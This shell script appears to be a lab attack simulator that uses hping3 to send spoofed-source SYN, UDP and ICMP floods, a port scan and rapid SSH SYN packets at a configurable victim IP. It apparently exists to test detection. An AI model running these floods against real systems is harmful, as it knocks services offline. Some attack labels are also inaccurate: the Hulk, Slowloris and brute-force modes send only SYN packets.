#!/bin/sh
# Lighthouse attack simulator — hping3
# Run inside the lh-attacker-hping container via:
#   docker exec lh-attacker-hping sh /home/attacks/hping_attacks.sh <attack> [victim_ip]
#
# Supported attacks:
#   ddos        SYN flood on port 80 (DDoS)
#   dos-hulk    HTTP GET flood       (DoS Hulk style)
#   dos-slow    Slow-header flood    (DoS Slowloris style)
#   portscan    TCP SYN scan of common ports
#   bruteforce  Rapid SSH connection attempts

VICTIM="${2:-172.28.0.10}"
ATTACK="${1:-ddos}"
DURATION=30   # seconds each attack runs

echo "[*] Target: $VICTIM  Attack: $ATTACK  Duration: ${DURATION}s"

case "$ATTACK" in

  # ── DDoS: SYN flood ──────────────────────────────────────────────
  ddos)
    echo "[*] DDoS SYN flood -> $VICTIM:80"
    timeout $DURATION hping3 \
      --syn \
      --flood \
      --rand-source \
      -p 80 \
      "$VICTIM"
    echo "[+] DDoS done"
    ;;

  # ── DDoS HTTPS: SYN flood on port 443 ───────────────────────────
  ddos-https)
    echo "[*] DDoS HTTPS SYN flood -> $VICTIM:443"
    timeout $DURATION hping3 \
      --syn \
      --flood \
      --rand-source \
      -p 443 \
      "$VICTIM"
    echo "[+] DDoS HTTPS done"
    ;;

  # ── DoS Hulk: rapid HTTP GET flood ──────────────────────────────
  dos-hulk)
    echo "[*] DoS Hulk HTTP flood -> $VICTIM:80"
    timeout $DURATION hping3 \
      --syn --ack \
      --flood \
      -p 80 \
      "$VICTIM"
    echo "[+] DoS Hulk done"
    ;;

  # ── DoS Slowloris: many half-open connections ────────────────────
  dos-slow)
    echo "[*] DoS Slowloris -> $VICTIM:80  (opening 200 slow connections)"
    i=0
    while [ $i -lt 200 ]; do
      hping3 --syn -p 80 -c 1 "$VICTIM" > /dev/null 2>&1 &
      i=$((i + 1))
    done
    sleep $DURATION
    echo "[+] DoS Slowloris done"
    ;;

  # ── Port Scan: TCP SYN scan across common ports ─────────────────
  portscan)
    echo "[*] Port scan -> $VICTIM  (ports 1-1024)"
    hping3 \
      --syn \
      --scan 1-1024 \
      "$VICTIM"
    echo "[+] Port scan done"
    ;;

  # ── Brute Force: rapid SSH connection attempts ───────────────────
  bruteforce)
    echo "[*] Brute force SSH -> $VICTIM:22  (${DURATION}s)"
    timeout $DURATION hping3 \
      --syn \
      -p 22 \
      --fast \
      "$VICTIM"
    echo "[+] Brute force done"
    ;;

  # ── UDP flood ────────────────────────────────────────────────────
  udp-flood)
    echo "[*] UDP flood -> $VICTIM:53"
    timeout $DURATION hping3 \
      --udp \
      --flood \
      --rand-source \
      -p 53 \
      "$VICTIM"
    echo "[+] UDP flood done"
    ;;

  # ── ICMP flood ───────────────────────────────────────────────────
  icmp-flood)
    echo "[*] ICMP flood -> $VICTIM"
    timeout $DURATION hping3 \
      --icmp \
      --flood \
      "$VICTIM"
    echo "[+] ICMP flood done"
    ;;

  # ── All attacks in sequence ──────────────────────────────────────
  all)
    for atk in ddos ddos-https dos-hulk dos-slow portscan bruteforce; do
      sh "$0" "$atk" "$VICTIM"
      sleep 5
    done
    echo "[+] All hping attacks done"
    ;;

  *)
    echo "Usage: $0 <ddos|ddos-https|dos-hulk|dos-slow|portscan|bruteforce|udp-flood|icmp-flood|all> [victim_ip]"
    exit 1
    ;;
esac
